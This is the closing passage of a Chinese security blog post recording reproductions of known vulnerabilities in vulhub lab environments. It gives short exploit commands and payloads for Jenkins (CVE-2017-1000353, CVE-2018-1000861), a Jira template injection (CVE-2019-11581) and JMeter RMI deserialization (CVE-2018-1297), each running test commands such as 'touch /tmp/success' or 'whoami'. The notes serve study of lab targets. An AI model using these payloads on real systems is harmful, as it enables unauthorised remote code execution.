<li><p>发送数据包，执行命令<br>下载<a href="https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py" target="_blank" rel="noopener">exploit.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py http://your-ip:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Jenkins远程命令执行漏洞（CVE-2018-1000861）"><a href="#Jenkins远程命令执行漏洞（CVE-2018-1000861）" class="headerlink" title="Jenkins远程命令执行漏洞（CVE-2018-1000861）"></a>Jenkins远程命令执行漏洞（CVE-2018-1000861）</h3><p>影响版本：Jenkins 2.153及更早版本，LTS 2.138.3及更早版本<br><a href="https://github.com/orangetw/awesome-jenkins-rce-2019" target="_blank" rel="noopener">自动化脚本</a>,访问如下url直接执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript</span><br><span class="line">?sandbox=<span class="literal">true</span></span><br><span class="line">&amp;value=public class x &#123;</span><br><span class="line">  public <span class="function"><span class="title">x</span></span>()&#123;</span><br><span class="line">    <span class="string">"touch /tmp/success"</span>.execute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Jira"><a href="#Jira" class="headerlink" title="Jira"></a>Jira</h2><p>Atlassian Jira是企业广泛使用的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。</p>
<h3 id="Atlassian-Jira-模板注入漏洞（CVE-2019-11581）"><a href="#Atlassian-Jira-模板注入漏洞（CVE-2019-11581）" class="headerlink" title="Atlassian Jira 模板注入漏洞（CVE-2019-11581）"></a>Atlassian Jira 模板注入漏洞（CVE-2019-11581）</h3><p>影响版本：4.4.x，5.x.x，6.x.x，7.x.x，8.0.x，8.1.x ，8.2.x<br>/secure/ContactAdministrators!default.jspa 主题处直接提交poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i18n</span>.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getMethod(<span class="string">'getRuntime'</span>, null).invoke(null, null).<span class="built_in">exec</span>(<span class="string">'whoami'</span>).toString()</span><br></pre></td></tr></table></figure></p>
<h2 id="jmeter"><a href="#jmeter" class="headerlink" title="jmeter"></a>jmeter</h2><p>Apache JMeter是美国阿帕奇（Apache）软件基金会的一套使用Java语言编写的用于压力测试和性能测试的开源软件</p>
<h3 id="Jmeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）"><a href="#Jmeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）" class="headerlink" title="Jmeter RMI 反序列化命令执行漏洞（CVE-2018-1297）"></a>Jmeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</h3><p>影响版本：2.x 3.x<br>直接使用ysoserial即可进行利用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 <span class="string">'touch /tmp/success'</span></span><br></pre></td></tr></table></figure></p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: cop</p><p>Ursprünglicher Link: <a href="http://yoursite.com/2020/07/13/vulhub复现记录/">http://yoursite.com/2020/07/13/vulhub复现记录/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/07/17/java学习笔记/" class="pre">java学习笔记</a><a href="/2020/07/03/7月6日周记录/" class="next">7月6日周记录</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-text">fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24-rce"><span class="toc-text">1.2.24-rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47-rce"><span class="toc-text">1.2.47-rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ffmpeg"><span class="toc-text">ffmpeg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-1897"><span class="toc-text">CVE-2016-1897</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pldays"><span class="toc-text">pldays</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask"><span class="toc-text">flask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti"><span class="toc-text">ssti</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fpm"><span class="toc-text">fpm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#activemq"><span class="toc-text">activemq</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ActiveMQ反序列化漏洞（CVE-2015-5254）"><span class="toc-text">ActiveMQ反序列化漏洞（CVE-2015-5254）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><span class="toc-text">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#写入webshell"><span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#写入crontab，自动化弹shell"><span class="toc-text">写入crontab，自动化弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppWeb"><span class="toc-text">AppWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#appweb认证绕过漏洞（CVE-2018-8715）"><span class="toc-text">appweb认证绕过漏洞（CVE-2018-8715）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aria2"><span class="toc-text">aria2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Aria2-任意文件写入漏洞"><span class="toc-text">Aria2 任意文件写入漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellshock-破壳漏洞（CVE-2014-6271）"><span class="toc-text">Shellshock 破壳漏洞（CVE-2014-6271）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi"><span class="toc-text">cgi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPoxy漏洞（CVE-2016-5385"><span class="toc-text">HTTPoxy漏洞（CVE-2016-5385)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coldfusion"><span class="toc-text">coldfusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><span class="toc-text">Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><span class="toc-text">Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#confluence"><span class="toc-text">confluence</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><span class="toc-text">Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#couchdb"><span class="toc-text">couchdb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><span class="toc-text">Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）"><span class="toc-text">Couchdb 任意命令执行漏洞（CVE-2017-12636）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#discuz"><span class="toc-text">discuz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><span class="toc-text">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discuz-X-≤3-4-任意文件删除漏洞"><span class="toc-text">Discuz!X ≤3.4 任意文件删除漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#django"><span class="toc-text">django</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Django-debug-page-XSS漏洞（CVE-2017-12794）"><span class="toc-text">Django debug page XSS漏洞（CVE-2017-12794）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Django任意URL跳转漏洞（CVE-2018-14574）"><span class="toc-text">Django任意URL跳转漏洞（CVE-2018-14574）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><span class="toc-text">Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Django-GIS-SQL注入漏洞（CVE-2020-9402）"><span class="toc-text">Django GIS SQL注入漏洞（CVE-2020-9402）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns"><span class="toc-text">dns</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS域传送漏洞"><span class="toc-text">DNS域传送漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#drupal"><span class="toc-text">drupal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><span class="toc-text">Drupal  “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><span class="toc-text">Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><span class="toc-text">Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal-远程代码执行漏洞（CVE-2018-7602）"><span class="toc-text">Drupal 远程代码执行漏洞（CVE-2018-7602）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal-远程代码执行漏洞（CVE-2019-6339）-amp-Drupal-XSS漏洞（CVE-2019-6341）"><span class="toc-text">Drupal 远程代码执行漏洞（CVE-2019-6339）&amp; Drupal XSS漏洞（CVE-2019-6341）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ecshop"><span class="toc-text">ecshop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><span class="toc-text">ECShop 2.x/3.x SQL注入/任意代码执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#elasticsearch"><span class="toc-text">elasticsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）"><span class="toc-text">ElasticSearch 命令执行漏洞（CVE-2014-3120）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><span class="toc-text">ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）"><span class="toc-text">ElasticSearch 目录穿越漏洞（CVE-2015-3337）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><span class="toc-text">ElasticSearch 目录穿越漏洞（CVE-2015-5531）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><span class="toc-text">Elasticsearch写入webshell漏洞（WooYun-2015-110216）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#electron"><span class="toc-text">electron</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#electron-远程命令执行漏洞（CVE-2018-1000006）"><span class="toc-text">electron 远程命令执行漏洞（CVE-2018-1000006）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）"><span class="toc-text">Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GhostScript"><span class="toc-text">GhostScript</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><span class="toc-text">GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><span class="toc-text">GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><span class="toc-text">GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#git"><span class="toc-text">git</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）"><span class="toc-text">GIT-SHELL 沙盒绕过（CVE-2017-8386）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitea"><span class="toc-text">gitea</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitea-1-4-0-目录穿越导致命令执行漏洞"><span class="toc-text">Gitea 1.4.0 目录穿越导致命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlab"><span class="toc-text">gitlab</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitlab-任意文件读取漏洞（CVE-2016-9086"><span class="toc-text">Gitlab 任意文件读取漏洞（CVE-2016-9086</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlist"><span class="toc-text">gitlist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gitlist-0-6-0-远程命令执行漏洞"><span class="toc-text">gitlist 0.6.0 远程命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glassfish"><span class="toc-text">glassfish</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GlassFish-任意文件读取漏洞"><span class="toc-text">GlassFish 任意文件读取漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#goahead"><span class="toc-text">goahead</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）"><span class="toc-text">GoAhead 远程命令执行漏洞（CVE-2017-17562）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gogs"><span class="toc-text">gogs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gogs-任意用户登录漏洞（CVE-2018-18925）"><span class="toc-text">Gogs 任意用户登录漏洞（CVE-2018-18925）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#h2database"><span class="toc-text">h2database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-Database-Console-未授权访问"><span class="toc-text">H2 Database Console 未授权访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hadoop"><span class="toc-text">hadoop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hadoop-YARN-ResourceManager-未授权访问"><span class="toc-text">Hadoop YARN ResourceManager 未授权访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#httpd"><span class="toc-text">httpd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><span class="toc-text">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-HTTPD-多后缀解析漏洞"><span class="toc-text">Apache HTTPD 多后缀解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-SSI-远程命令执行漏洞"><span class="toc-text">Apache SSI 远程命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#imagemagick"><span class="toc-text">imagemagick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Imagetragick-命令执行漏洞（CVE-2016–3714）"><span class="toc-text">Imagetragick 命令执行漏洞（CVE-2016–3714）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#influxdb"><span class="toc-text">influxdb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#influxdb未授权访问漏洞"><span class="toc-text">influxdb未授权访问漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jackson"><span class="toc-text">jackson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）"><span class="toc-text">Jackson-databind 反序列化漏洞（CVE-2017-7525）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-text">java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09"><span class="toc-text">Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><span class="toc-text">Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jboss"><span class="toc-text">jboss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><span class="toc-text">JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Boss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><span class="toc-text">Boss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JBoss-JMXInvokerServlet-反序列化漏洞"><span class="toc-text">JBoss JMXInvokerServlet 反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins"><span class="toc-text">Jenkins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><span class="toc-text">Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins远程命令执行漏洞（CVE-2018-1000861）"><span class="toc-text">Jenkins远程命令执行漏洞（CVE-2018-1000861）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jira"><span class="toc-text">Jira</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Atlassian-Jira-模板注入漏洞（CVE-2019-11581）"><span class="toc-text">Atlassian Jira 模板注入漏洞（CVE-2019-11581）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jmeter"><span class="toc-text">jmeter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jmeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）"><span class="toc-text">Jmeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</span></a></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/233/">233</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/20/vulhub复现记录-2/">vulhub复现记录-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/17/java学习笔记/">java学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/13/vulhub复现记录/">vulhub复现记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/7月6日周记录/">7月6日周记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/刷cve/">buu按顺序刷题知识点小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF/">GkCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/20/2020网鼎后三场wp/">2020网鼎后三场wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/11/2020网鼎杯wp/">2020网鼎杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/。。。/">。。。</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">35</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>